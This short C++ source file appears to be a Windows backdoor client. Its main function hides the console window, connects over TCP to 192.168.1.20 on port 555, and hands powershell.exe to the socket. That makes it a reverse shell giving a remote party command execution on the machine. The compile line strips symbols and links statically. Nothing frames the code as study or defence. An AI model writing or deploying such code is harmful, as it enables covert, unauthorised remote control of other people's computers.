//compile : g++ socket_winbd.cpp test_winbd.cpp -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
#include "socket_winbd.h"
//#include "comd_socket.h" rajouter comd_socket.cpp


int main()
{
	FreeConsole();
	SOCKET socks;
	WSADATA wsa;

	struct sockaddr_in session;

	WSAStartup(MAKEWORD(2, 2), &wsa);
	socks = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);

	session.sin_family = AF_INET;
	session.sin_addr.s_addr = inet_addr("192.168.1.20");
	session.sin_port = htons(555);

	int c = connect(socks, session);
	if (c != -1)
	{
		execute_process(socks, "powershell.exe");
	}
	return 0;
}